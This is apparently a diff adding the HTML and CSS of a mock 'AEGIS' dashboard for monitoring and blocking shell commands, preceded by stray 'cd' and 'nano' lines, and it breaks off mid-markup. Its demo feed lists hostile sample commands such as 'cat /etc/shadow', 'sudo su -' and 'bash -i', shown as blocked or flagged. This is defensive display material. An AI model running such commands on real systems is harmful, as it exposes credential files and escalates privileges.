@@ -1,0 +1,1413 @@
+cd /workspaces/aegis.mvp-1
+# Create the file
+nano aegis_dashboard.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AEGIS — Hammer Defense Industries</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;500;600;700;900&family=Barlow+Condensed:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --void: #020408;
+    --deep: #050d14;
+    --surface: #091520;
+    --panel: #0d1e2e;
+    --border: #0e2a3d;
+    --border-bright: #1a4a6b;
+    --accent: #00c8ff;
+    --accent-dim: #007fa3;
+    --accent-glow: rgba(0, 200, 255, 0.15);
+    --warn: #ff6b35;
+    --warn-glow: rgba(255, 107, 53, 0.15);
+    --critical: #ff2d55;
+    --critical-glow: rgba(255, 45, 85, 0.2);
+    --safe: #00e5a0;
+    --safe-glow: rgba(0, 229, 160, 0.15);
+    --flag: #ffd60a;
+    --flag-glow: rgba(255, 214, 10, 0.15);
+    --text-primary: #e8f4fd;
+    --text-secondary: #7ab3cc;
+    --text-muted: #3a6880;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Barlow', sans-serif;
+    --condensed: 'Barlow Condensed', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--void);
+    color: var(--text-primary);
+    font-family: var(--sans);
+    min-height: 100vh;
+    overflow-x: hidden;
+    cursor: default;
+  }
+
+  /* GRID BACKGROUND */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,200,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,200,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* SCAN LINE ANIMATION */
+  body::after {
+    content: '';
+    position: fixed;
+    top: -100%;
+    left: 0;
+    right: 0;
+    height: 200px;
+    background: linear-gradient(transparent, rgba(0,200,255,0.04), transparent);
+    animation: scanline 8s linear infinite;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  @keyframes scanline {
+    0% { top: -200px; }
+    100% { top: 100vh; }
+  }
+
+  /* TOP NAV */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 56px;
+    background: rgba(5, 13, 20, 0.95);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 32px;
+    z-index: 100;
+    backdrop-filter: blur(20px);
+  }
+
+  .nav-left {
+    display: flex;
+    align-items: center;
+    gap: 24px;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo-mark {
+    width: 32px;
+    height: 32px;
+    position: relative;
+  }
+
+  .logo-mark svg {
+    width: 100%;
+    height: 100%;
+  }
+
+  .logo-text {
+    font-family: var(--condensed);
+    font-weight: 900;
+    font-size: 22px;
+    letter-spacing: 4px;
+    color: var(--accent);
+    text-transform: uppercase;
+  }
+
+  .logo-sub {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-muted);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-top: -4px;
+  }
+
+  .nav-divider {
+    width: 1px;
+    height: 24px;
+    background: var(--border);
+  }
+
+  .nav-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .nav-right {
+    display: flex;
+    align-items: center;
+    gap: 24px;
+  }
+
+  .status-pill {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 4px 12px;
+    border: 1px solid var(--safe);
+    border-radius: 2px;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--safe);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .status-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--safe);
+    animation: pulse-safe 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse-safe {
+    0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,229,160,0.4); }
+    50% { opacity: 0.7; box-shadow: 0 0 0 4px rgba(0,229,160,0); }
+  }
+
+  .nav-time {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-secondary);
+    letter-spacing: 1px;
+  }
+
+  .nav-user {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    color: var(--text-secondary);
+    font-weight: 500;
+    letter-spacing: 1px;
+  }
+
+  .avatar {
+    width: 28px;
+    height: 28px;
+    border-radius: 2px;
+    background: linear-gradient(135deg, var(--accent-dim), var(--border-bright));
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    font-weight: bold;
+  }
+
+  /* MAIN LAYOUT */
+  .main {
+    padding-top: 56px;
+    min-height: 100vh;
+    position: relative;
+    z-index: 2;
+  }
+
+  /* HERO SECTION */
+  .hero {
+    padding: 32px 32px 0;
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr 320px;
+    gap: 16px;
+    margin-bottom: 16px;
+  }
+
+  /* STAT CARDS */
+  .stat-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 24px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.3s;
+  }
+
+  .stat-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px;
+    height: 100%;
+  }
+
+  .stat-card.accent::before { background: var(--accent); }
+  .stat-card.critical::before { background: var(--critical); }
+  .stat-card.warn::before { background: var(--warn); }
+  .stat-card.safe::before { background: var(--safe); }
+
+  .stat-card:hover { border-color: var(--border-bright); }
+
+  .stat-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+  }
+
+  .stat-value {
+    font-family: var(--condensed);
+    font-size: 52px;
+    font-weight: 900;
+    line-height: 1;
+    margin-bottom: 8px;
+  }
+
+  .stat-card.accent .stat-value { color: var(--accent); }
+  .stat-card.critical .stat-value { color: var(--critical); }
+  .stat-card.warn .stat-value { color: var(--warn); }
+  .stat-card.safe .stat-value { color: var(--safe); }
+
+  .stat-delta {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+  }
+
+  .stat-delta span { color: var(--safe); }
+  .stat-delta.neg span { color: var(--critical); }
+
+  /* THREAT LEVEL CARD */
+  .threat-level-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 24px;
+    position: relative;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+  }
+
+  .threat-level-card::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at top right, var(--warn-glow), transparent 60%);
+    pointer-events: none;
+  }
+
+  .tl-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .tl-value {
+    font-family: var(--condensed);
+    font-size: 36px;
+    font-weight: 900;
+    color: var(--warn);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    text-shadow: 0 0 30px rgba(255,107,53,0.5);
+  }
+
+  .tl-bar-wrap {
+    margin-top: 8px;
+  }
+
+  .tl-bar-track {
+    height: 4px;
+    background: var(--border);
+    border-radius: 0;
+    overflow: hidden;
+  }
+
+  .tl-bar-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--safe), var(--flag), var(--warn), var(--critical));
+    width: 62%;
+    transition: width 1s ease;
+  }
+
+  .tl-indicators {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 6px;
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+  }
+
+  /* CONTENT GRID */
+  .content {
+    padding: 0 32px 32px;
+    display: grid;
+    grid-template-columns: 1fr 380px;
+    gap: 16px;
+  }
+
+  .content-left {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  .content-right {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  /* PANEL COMPONENT */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .panel-header {
+    padding: 16px 24px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: rgba(0,200,255,0.02);
+  }
+
+  .panel-title {
+    font-family: var(--condensed);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--text-secondary);
+  }
+
+  .panel-badge {
+    font-family: var(--mono);
+    font-size: 9px;
+    padding: 3px 8px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-radius: 1px;
+  }
+
+  .badge-live {
+    background: rgba(0,229,160,0.1);
+    border: 1px solid rgba(0,229,160,0.3);
+    color: var(--safe);
+  }
+
+  .badge-mitre {
+    background: rgba(0,200,255,0.1);
+    border: 1px solid rgba(0,200,255,0.3);
+    color: var(--accent);
+  }
+
+  /* ACTIVITY FEED */
+  .feed {
+    max-height: 360px;
+    overflow-y: auto;
+  }
+
+  .feed::-webkit-scrollbar { width: 4px; }
+  .feed::-webkit-scrollbar-track { background: var(--deep); }
+  .feed::-webkit-scrollbar-thumb { background: var(--border-bright); }
+
+  .feed-item {
+    padding: 14px 24px;
+    border-bottom: 1px solid rgba(14, 42, 61, 0.5);
+    display: grid;
+    grid-template-columns: 80px 1fr auto;
+    gap: 16px;
+    align-items: center;
+    transition: background 0.2s;
+    animation: fadeIn 0.4s ease forwards;
+    opacity: 0;
+  }
+
+  .feed-item:hover { background: rgba(0,200,255,0.03); }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateX(-8px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+
+  .feed-item:nth-child(1) { animation-delay: 0.1s; }
+  .feed-item:nth-child(2) { animation-delay: 0.2s; }
+  .feed-item:nth-child(3) { animation-delay: 0.3s; }
+  .feed-item:nth-child(4) { animation-delay: 0.4s; }
+  .feed-item:nth-child(5) { animation-delay: 0.5s; }
+  .feed-item:nth-child(6) { animation-delay: 0.6s; }
+  .feed-item:nth-child(7) { animation-delay: 0.7s; }
+
+  .feed-status {
+    font-family: var(--mono);
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 4px 8px;
+    border-radius: 1px;
+    text-align: center;
+  }
+
+  .status-blocked {
+    background: var(--critical-glow);
+    border: 1px solid rgba(255,45,85,0.4);
+    color: var(--critical);
+  }
+
+  .status-flagged {
+    background: var(--flag-glow);
+    border: 1px solid rgba(255,214,10,0.4);
+    color: var(--flag);
+  }
+
+  .status-success {
+    background: var(--safe-glow);
+    border: 1px solid rgba(0,229,160,0.4);
+    color: var(--safe);
+  }
+
+  .feed-content {}
+
+  .feed-cmd {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-primary);
+    margin-bottom: 4px;
+  }
+
+  .feed-meta {
+    font-size: 11px;
+    color: var(--text-muted);
+    display: flex;
+    gap: 16px;
+    flex-wrap: wrap;
+  }
+
+  .mitre-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent);
+    background: var(--accent-glow);
+    border: 1px solid rgba(0,200,255,0.2);
+    padding: 2px 6px;
+    border-radius: 1px;
+  }
+
+  .feed-risk {
+    text-align: right;
+  }
+
+  .risk-score {
+    font-family: var(--condensed);
+    font-size: 28px;
+    font-weight: 900;
+    line-height: 1;
+  }
+
+  .risk-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .risk-0 { color: var(--safe); }
+  .risk-40 { color: var(--flag); }
+  .risk-80 { color: var(--critical); }
+
+  /* ACTIVITY CHART */
+  .chart-area {
+    padding: 24px;
+    height: 180px;
+    position: relative;
+  }
+
+  .chart-svg {
+    width: 100%;
+    height: 100%;
+  }
+
+  /* MITRE MATRIX */
+  .mitre-grid {
+    padding: 20px 24px;
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 8px;
+  }
+
+  .mitre-cell {
+    padding: 10px 8px;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .mitre-cell:hover {
+    border-color: var(--accent);
+    background: var(--accent-glow);
+  }
+
+  .mitre-cell.active {
+    border-color: var(--critical);
+    background: var(--critical-glow);
+    animation: pulse-cell 2s ease-in-out infinite;
+  }
+
+  .mitre-cell.warn-active {
+    border-color: var(--warn);
+    background: var(--warn-glow);
+  }
+
+  @keyframes pulse-cell {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(255,45,85,0.2); }
+    50% { box-shadow: 0 0 0 4px rgba(255,45,85,0); }
+  }
+
+  .mitre-id {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+    margin-bottom: 4px;
+  }
+
+  .mitre-name {
+    font-size: 10px;
+    color: var(--text-secondary);
+    font-weight: 600;
+    line-height: 1.3;
+  }
+
+  .mitre-cell.active .mitre-id { color: var(--critical); }
+  .mitre-cell.active .mitre-name { color: var(--text-primary); }
+  .mitre-cell.warn-active .mitre-id { color: var(--warn); }
+  .mitre-cell.warn-active .mitre-name { color: var(--text-primary); }
+
+  /* AUDIT LOG */
+  .audit-list {
+    padding: 0;
+  }
+
+  .audit-item {
+    padding: 14px 24px;
+    border-bottom: 1px solid rgba(14, 42, 61, 0.5);
+    animation: fadeIn 0.4s ease forwards;
+    opacity: 0;
+  }
+
+  .audit-item:nth-child(1) { animation-delay: 0.2s; }
+  .audit-item:nth-child(2) { animation-delay: 0.35s; }
+  .audit-item:nth-child(3) { animation-delay: 0.5s; }
+  .audit-item:nth-child(4) { animation-delay: 0.65s; }
+
+  .audit-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 6px;
+  }
+
+  .audit-id {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 1px;
+  }
+
+  .audit-time {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+  }
+
+  .audit-detail {
+    font-size: 11px;
+    color: var(--text-secondary);
+    line-height: 1.5;
+  }
+
+  .audit-detail strong {
+    color: var(--text-primary);
+    font-weight: 600;
+  }
+
+  /* RISK GAUGE */
+  .gauge-wrap {
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .gauge-svg {
+    width: 180px;
+    height: 100px;
+  }
+
+  .gauge-value-wrap {
+    text-align: center;
+    margin-top: -8px;
+  }
+
+  .gauge-value {
+    font-family: var(--condensed);
+    font-size: 48px;
+    font-weight: 900;
+    color: var(--warn);
+    line-height: 1;
+    text-shadow: 0 0 30px rgba(255,107,53,0.4);
+  }
+
+  .gauge-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-top: 4px;
+  }
+
+  /* COMMAND INPUT SIMULATOR */
+  .cmd-sim {
+    padding: 20px 24px;
+  }
+
+  .cmd-input-wrap {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 12px 16px;
+    margin-bottom: 12px;
+    transition: border-color 0.2s;
+  }
+
+  .cmd-input-wrap:focus-within {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 1px rgba(0,200,255,0.1);
+  }
+
+  .cmd-prompt {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+  }
+
+  .cmd-input {
+    background: transparent;
+    border: none;
+    outline: none;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-primary);
+    width: 100%;
+    caret-color: var(--accent);
+  }
+
+  .cmd-input::placeholder {
+    color: var(--text-muted);
+  }
+
+  .cmd-btn {
+    background: var(--accent);
+    color: var(--void);
+    border: none;
+    padding: 10px 20px;
+    font-family: var(--condensed);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.2s;
+    width: 100%;
+  }
+
+  .cmd-btn:hover {
+    background: #33d4ff;
+    box-shadow: 0 0 20px rgba(0,200,255,0.3);
+  }
+
+  .cmd-result {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 12px 16px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text-secondary);
+    min-height: 48px;
+    line-height: 1.6;
+    display: none;
+  }
+
+  .cmd-result.show { display: block; }
+  .cmd-result.blocked { border-color: rgba(255,45,85,0.4); color: var(--critical); }
+  .cmd-result.flagged { border-color: rgba(255,214,10,0.4); color: var(--flag); }
+  .cmd-result.success { border-color: rgba(0,229,160,0.4); color: var(--safe); }
+
+  /* FOOTER */
+  .dash-footer {
+    padding: 16px 32px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .footer-left {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .footer-right {
+    display: flex;
+    gap: 24px;
+  }
+
+  .footer-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+    padding: 4px 10px;
+    border: 1px solid var(--border);
+    text-transform: uppercase;
+  }
+
+  /* CLASSIFICATION BANNER */
+  .class-banner {
+    background: rgba(255,107,53,0.08);
+    border-top: 1px solid rgba(255,107,53,0.2);
+    border-bottom: 1px solid rgba(255,107,53,0.2);
+    padding: 6px 32px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .class-text {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--warn);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+  }
+
+  .class-dot {
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: var(--warn);
+    opacity: 0.5;
+  }
+
+  /* RESPONSIVE SPARKLINE */
+  .spark-row {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 40px;
+    margin-top: 12px;
+  }
+
+  .spark-bar {
+    flex: 1;
+    background: var(--border);
+    border-radius: 1px;
+    transition: background 0.3s;
+  }
+
+  .spark-bar.blocked { background: var(--critical); opacity: 0.7; }
+  .spark-bar.flagged { background: var(--flag); opacity: 0.7; }
+  .spark-bar.safe { background: var(--safe); opacity: 0.4; }
+
+  /* HORIZONTAL RULE ACCENT */
+  .hr-accent {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent-dim), transparent);
+    margin: 0;
+    opacity: 0.4;
+  }
+
+  /* NODES VISUALIZATION */
+  .nodes-wrap {
+    padding: 20px 24px;
+    position: relative;
+    height: 160px;
+  }
+
+  .nodes-svg {
+    width: 100%;
+    height: 100%;
+  }
+</style>
+</head>
+<body>
+
+<!-- CLASSIFICATION BANNER -->
+<div class="class-banner">
+  <div class="class-dot"></div>
+  <div class="class-text">Hammer Defense Industries — Aegis Platform v1.0 — Authorized Personnel Only</div>
+  <div class="class-dot"></div>
+</div>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-left">
+    <div class="logo">
+      <div class="logo-mark">
+        <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polygon points="16,2 30,9 30,23 16,30 2,23 2,9" fill="none" stroke="#00c8ff" stroke-width="1.5"/>
+          <polygon points="16,7 25,11.5 25,20.5 16,25 7,20.5 7,11.5" fill="none" stroke="#00c8ff" stroke-width="0.75" opacity="0.5"/>
+          <circle cx="16" cy="16" r="3" fill="#00c8ff" opacity="0.9"/>
+          <line x1="16" y1="2" x2="16" y2="7" stroke="#00c8ff" stroke-width="1" opacity="0.6"/>
+          <line x1="16" y1="25" x2="16" y2="30" stroke="#00c8ff" stroke-width="1" opacity="0.6"/>
+          <line x1="30" y1="9" x2="25" y2="11.5" stroke="#00c8ff" stroke-width="1" opacity="0.6"/>
+          <line x1="2" y1="9" x2="7" y2="11.5" stroke="#00c8ff" stroke-width="1" opacity="0.6"/>
+          <line x1="30" y1="23" x2="25" y2="20.5" stroke="#00c8ff" stroke-width="1" opacity="0.6"/>
+          <line x1="2" y1="23" x2="7" y2="20.5" stroke="#00c8ff" stroke-width="1" opacity="0.6"/>
+        </svg>
+      </div>
+      <div>
+        <div class="logo-text">Aegis</div>
+        <div class="logo-sub">Zero Trust Command Intelligence</div>
+      </div>
+    </div>
+    <div class="nav-divider"></div>
+    <div class="nav-tag">HDI // CLASSIFIED OPS</div>
+  </div>
+  <div class="nav-right">
+    <div class="status-pill">
+      <div class="status-dot"></div>
+      Monitoring Active
+    </div>
+    <div class="nav-time" id="navTime">--:--:-- UTC</div>
+    <div class="nav-user">
+      <div class="avatar">HD</div>
+      OPERATOR
+    </div>
+  </div>
+</nav>
+
+<div class="main">
+
+  <!-- HERO STATS -->
+  <div class="hero">
+    <div class="stat-card accent">
+      <div class="stat-label">Commands Intercepted</div>
+      <div class="stat-value" id="totalCmds">2,847</div>
+      <div class="stat-delta">Session total <span>+12 last hour</span></div>
+      <div class="spark-row" id="sparkTotal"></div>
+    </div>
+
+    <div class="stat-card critical">
+      <div class="stat-label">Threats Blocked</div>
+      <div class="stat-value" id="blockedCmds">341</div>
+      <div class="stat-delta neg">Hard blocks <span>+3 last hour</span></div>
+      <div class="spark-row" id="sparkBlocked"></div>
+    </div>
+
+    <div class="stat-card warn">
+      <div class="stat-label">Flagged / Monitored</div>
+      <div class="stat-value" id="flaggedCmds">519</div>
+      <div class="stat-delta">MITRE-tagged <span>+7 last hour</span></div>
+      <div class="spark-row" id="sparkFlagged"></div>
+    </div>
+
+    <div class="threat-level-card">
+      <div>
+        <div class="tl-label">Current Threat Level</div>
+        <div class="tl-value">ELEVATED</div>
+      </div>
+      <div>
+        <div class="tl-bar-wrap">
+          <div class="tl-bar-track">
+            <div class="tl-bar-fill" id="threatBar"></div>
+          </div>
+          <div class="tl-indicators">
+            <span>LOW</span><span>MED</span><span>HIGH</span><span>CRIT</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="content">
+    <div class="content-left">
+
+      <!-- LIVE ACTIVITY FEED -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">Live Command Intelligence Feed</div>
+          <div class="panel-badge badge-live">● Live</div>
+        </div>
+        <div class="feed" id="activityFeed">
+          <div class="feed-item">
+            <div class="feed-status status-blocked">BLOCKED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">cat /etc/shadow</div>
+              <div class="feed-meta">
+                <span>User: operator_01</span>
+                <span>04:33:33 UTC</span>
+                <span class="mitre-tag">T1003</span>
+                <span class="mitre-tag">T1059.004</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-80">80</div>
+              <div class="risk-label">CRITICAL</div>
+            </div>
+          </div>
+          <div class="feed-item">
+            <div class="feed-status status-blocked">BLOCKED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">sudo su -</div>
+              <div class="feed-meta">
+                <span>User: operator_01</span>
+                <span>04:33:16 UTC</span>
+                <span class="mitre-tag">T1548</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-40">40</div>
+              <div class="risk-label">MEDIUM</div>
+            </div>
+          </div>
+          <div class="feed-item">
+            <div class="feed-status status-flagged">FLAGGED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">whoami</div>
+              <div class="feed-meta">
+                <span>User: operator_01</span>
+                <span>04:33:34 UTC</span>
+                <span class="mitre-tag">T1033</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-40">40</div>
+              <div class="risk-label">FLAGGED</div>
+            </div>
+          </div>
+          <div class="feed-item">
+            <div class="feed-status status-success">ALLOWED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">ls -la /var/log</div>
+              <div class="feed-meta">
+                <span>User: operator_02</span>
+                <span>04:32:11 UTC</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-0">0</div>
+              <div class="risk-label">CLEAN</div>
+            </div>
+          </div>
+          <div class="feed-item">
+            <div class="feed-status status-blocked">BLOCKED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">python3 -c "import os; os.system('id')"</div>
+              <div class="feed-meta">
+                <span>User: unknown</span>
+                <span>04:31:44 UTC</span>
+                <span class="mitre-tag">T1059.006</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-80">60</div>
+              <div class="risk-label">HIGH</div>
+            </div>
+          </div>
+          <div class="feed-item">
+            <div class="feed-status status-success">ALLOWED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">systemctl status nginx</div>
+              <div class="feed-meta">
+                <span>User: operator_03</span>
+                <span>04:30:02 UTC</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-0">0</div>
+              <div class="risk-label">CLEAN</div>
+            </div>
+          </div>
+          <div class="feed-item">
+            <div class="feed-status status-flagged">FLAGGED</div>
+            <div class="feed-content">
+              <div class="feed-cmd">bash -i</div>
+              <div class="feed-meta">
+                <span>User: operator_01</span>
+                <span>04:29:17 UTC</span>
+                <span class="mitre-tag">T1059.004</span>
+              </div>
+            </div>
+            <div class="feed-risk">
+              <div class="risk-score risk-40">40</div>
+              <div class="risk-label">MEDIUM</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ACTIVITY TIMELINE -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">24-Hour Threat Activity</div>
+          <div class="panel-badge badge-mitre">MITRE ATT&CK</div>
+        </div>
+        <div class="chart-area">
+          <svg class="chart-svg" viewBox="0 0 600 140" preserveAspectRatio="none">
+            <defs>
+              <linearGradient id="gradBlocked" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#ff2d55" stop-opacity="0.4"/>
+                <stop offset="100%" stop-color="#ff2d55" stop-opacity="0"/>
+              </linearGradient>
+              <linearGradient id="gradFlagged" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#ffd60a" stop-opacity="0.3"/>
+                <stop offset="100%" stop-color="#ffd60a" stop-opacity="0"/>
+              </linearGradient>
+            </defs>
+            <!-- Grid lines -->
+            <line x1="0" y1="35" x2="600" y2="35" stroke="#0e2a3d" stroke-width="1"/>
+            <line x1="0" y1="70" x2="600" y2="70" stroke="#0e2a3d" stroke-width="1"/>
+            <line x1="0" y1="105" x2="600" y2="105" stroke="#0e2a3d" stroke-width="1"/>
+            <!-- Flagged area -->
+            <path d="M0,90 L25,85 L50,88 L75,75 L100,80 L125,70 L150,72 L175,65 L200,68 L225,60 L250,55 L275,58 L300,50 L325,52 L350,45 L375,48 L400,42 L425,38 L450,44 L475,40 L500,35 L525,38 L550,32 L575,35 L600,30 L600,140 L0,140 Z"
+                  fill="url(#gradFlagged)" opacity="0.6"/>
+            <path d="M0,90 L25,85 L50,88 L75,75 L100,80 L125,70 L150,72 L175,65 L200,68 L225,60 L250,55 L275,58 L300,50 L325,52 L350,45 L375,48 L400,42 L425,38 L450,44 L475,40 L500,35 L525,38 L550,32 L575,35 L600,30"
+                  fill="none" stroke="#ffd60a" stroke-width="1.5" opacity="0.7"/>
+            <!-- Blocked area -->
+            <path d="M0,120 L25,115 L50,118 L75,110 L100,115 L125,105 L150,108 L175,100 L200,95 L225,100 L250,90 L275,92 L300,85 L325,88 L350,80 L375,75 L400,78 L425,70 L450,72 L475,65 L500,60 L525,58 L550,55 L575,52 L600,48 L600,140 L0,140 Z"
+                  fill="url(#gradBlocked)" opacity="0.8"/>
+            <path d="M0,120 L25,115 L50,118 L75,110 L100,115 L125,105 L150,108 L175,100 L200,95 L225,100 L250,90 L275,92 L300,85 L325,88 L350,80 L375,75 L400,78 L425,70 L450,72 L475,65 L500,60 L525,58 L550,55 L575,52 L600,48"
+                  fill="none" stroke="#ff2d55" stroke-width="2" opacity="0.9"/>
+            <!-- Hour labels -->
+            <text x="0" y="135" fill="#3a6880" font-size="8" font-family="Share Tech Mono">00:00</text>
+            <text x="120" y="135" fill="#3a6880" font-size="8" font-family="Share Tech Mono">06:00</text>
+            <text x="245" y="135" fill="#3a6880" font-size="8" font-family="Share Tech Mono">12:00</text>
+            <text x="370" y="135" fill="#3a6880" font-size="8" font-family="Share Tech Mono">18:00</text>
+            <text x="555" y="135" fill="#3a6880" font-size="8" font-family="Share Tech Mono">NOW</text>
+            <!-- Legend -->
+            <rect x="450" y="8" width="8" height="8" fill="#ff2d55" opacity="0.8"/>
+            <text x="462" y="16" fill="#7ab3cc" font-size="9" font-family="Share Tech Mono">BLOCKED</text>
+            <rect x="520" y="8" width="8" height="8" fill="#ffd60a" opacity="0.7"/>
+            <text x="532" y="16" fill="#7ab3cc" font-size="9" font-family="Share Tech Mono">FLAGGED</text>
+          </svg>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- RIGHT COLUMN -->
+    <div class="content-right">
+
+      <!-- LIVE COMMAND TESTER -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">Command Analysis Engine</div>
+          <div class="panel-badge badge-live">● Active</div>
+        </div>
+        <div class="cmd-sim">
+          <div class="cmd-input-wrap">
+            <div class="cmd-prompt">aegis $</div>
